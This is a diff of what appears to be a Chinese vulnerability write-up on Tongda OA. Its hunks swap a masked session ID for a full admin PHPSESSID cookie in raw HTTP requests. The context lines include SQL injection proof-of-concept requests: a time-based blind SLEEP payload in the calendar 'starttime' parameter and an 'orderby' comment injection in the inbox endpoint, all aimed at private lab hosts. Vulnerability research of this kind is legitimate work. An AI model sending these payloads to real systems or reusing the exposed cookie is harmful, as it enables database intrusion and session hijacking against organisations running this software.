@@ -69,7 +69,7 @@ HW 这几天看到大家对通达 OA 的热情度很高，正好今天有空，�
 POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
 Referer: http://192.168.202.1/portal/home/
-Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Connection: keep-alive
 Host: 192.168.43.169
 Pragma: no-cache
@@ -90,7 +90,7 @@ starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0
 GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=1&pagelimit=20&tag=×tamp=1598069133&total= HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169/
-Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
@@ -117,7 +117,7 @@ Connection: close
 GET /general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=3--&pagelimit=10&tag=×tamp=1598069103&total= HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169
-Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
@@ -129,7 +129,7 @@ Connection: close
 GET /general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169
-Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
@@ -173,7 +173,7 @@ http://127.0.0.1/general/calendar/arrange/get_cal_list.php?starttime=1548058874&
 GET /general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 HTTP/1.1
 X-Requested-With: XMLHttpRequest
 Referer: http://192.168.43.169
-Cookie: PHPSESSID=5************************0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
+Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate
 Host: 192.168.43.169
